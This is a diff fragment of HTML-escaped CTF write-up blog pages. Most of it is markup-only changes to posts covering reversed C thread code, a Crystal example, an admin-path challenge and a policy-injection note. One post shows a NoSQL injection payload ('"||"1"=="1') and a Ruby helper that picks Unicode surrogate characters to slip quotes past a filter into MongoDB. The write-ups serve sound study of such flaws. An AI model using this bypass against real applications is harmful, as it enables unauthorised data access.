 &lt;p&gt;This is terrible, we can only use two directives, the first one, &lt;code class=&quot;highlighter-rouge&quot;&gt;conditions&lt;/code&gt;, will overwrite our injected condition again, so we do not win anything, and the second, &lt;code class=&quot;highlighter-rouge&quot;&gt;expiration&lt;/code&gt;, only supports a single string as value.&lt;/p&gt;
 
@@ -887,7 +1315,7 @@ ostia.. un sec (the hell... wait a second...)
 
 JAJASDJASJASODJASOJDAOSJDAOSJdas (laughts in spanish)
 
-ME MATO (I'll kill myself)
+ME MATO (I&apos;ll kill myself)
 
 lo tengo (I got it)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -960,7 +1388,7 @@ Author: avlidienbrunn
 &lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
 &lt;p&gt;First is first, let’s see what this application looks like on it’s root path:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-    What's it gonna be? Are you an 
+    What&apos;s it gonna be? Are you an 
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/uberadmin/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;uberadmin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
     an &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/admin/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
     a &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/user/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;user&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, 
@@ -1183,7 +1611,7 @@ BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
 
 &lt;p&gt;The C code will look like the following:&lt;/p&gt;
 
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -1212,10 +1640,10 @@ BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
 &lt;p&gt;Been this a short program, we can reconstruct it’s C code, to avoid dealing with GDB debugging over threads and time dependant variables, it’s easier for me to do it this way.&lt;/p&gt;
 
 &lt;p&gt;Here’s the C code:&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;pthread.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
 &lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x87&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x93&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
@@ -1230,7 +1658,7 @@ BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TR1 -&amp;gt; 0x%02x ^ 22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
@@ -1241,7 +1669,7 @@ BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0.4 segundos&lt;/span&gt;
@@ -1252,7 +1680,7 @@ BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr2_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -1441,7 +1869,7 @@ TR2 -&amp;gt; 0x57 = 0x57 ^ 0x67 ^ 0x80 -&amp;gt; 0xffffffb0
 
 &lt;p&gt;A Crystal Hello World example, looks like this:&lt;/p&gt;
 
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Hello world!'&lt;/span&gt;
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Hello world!&apos;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Yes, just like Ruby. To compile this, let’s save it as &lt;code class=&quot;highlighter-rouge&quot;&gt;hello.cr&lt;/code&gt; and execute the Crystal compiler: &lt;code class=&quot;highlighter-rouge&quot;&gt;crystal build hello.cr&lt;/code&gt;. This should create a &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; executable with the following characteristics: &lt;code class=&quot;highlighter-rouge&quot;&gt;hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped&lt;/code&gt;&lt;/p&gt;
@@ -1717,7 +2145,7 @@ X-Forwarded-For: XXXXXXXXXXXXXXXXXXXXXXXs
 
 &lt;h4 id=&quot;not-that-easy-theres-a-waf&quot;&gt;Not that easy, there’s a “WAF”&lt;/h4&gt;
 &lt;p&gt;Testing some characters show us that there’s some kind of check for the following chars:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; ' . (space)&lt;/code&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; &apos; . (space)&lt;/code&gt;
 Why those characters and not others like &amp;gt; or &amp;lt;? Because (not-so-obviously) what they are trying to avoid is a NoSQL Injection, probably on a MongoDB database.&lt;/p&gt;
 
 &lt;p&gt;So logic seems to be:&lt;/p&gt;
@@ -1746,14 +2174,14 @@ Why those characters and not others like &amp;gt; or &amp;lt;? Because (not-so-o
 &lt;h3 id=&quot;error-error-error-error-victory&quot;&gt;Error, error, error, error, victory!&lt;/h3&gt;
 &lt;p&gt;After a lot of testing and a key of my man X-C3LL, seems that MongoDB is reading the least significant byte of each surrogate pair, well, let’s test if this is true using &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;||&quot;1&quot;==&quot;1&lt;/code&gt; payload,  but remember, we can’t just use &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, so we need to figure out a unicode which contains 0x22 and 0x7C as their least significant bytes of each surrogate pair.&lt;/p&gt;
 
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# This receives a string of two characters, and looks for a unicode hex who's surrogate pairs least significant byte, match each character hex representation.&lt;/span&gt;
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# This receives a string of two characters, and looks for a unicode hex who&apos;s surrogate pairs least significant byte, match each character hex representation.&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;uni&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFF&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDC00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
 
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'U'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;U&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
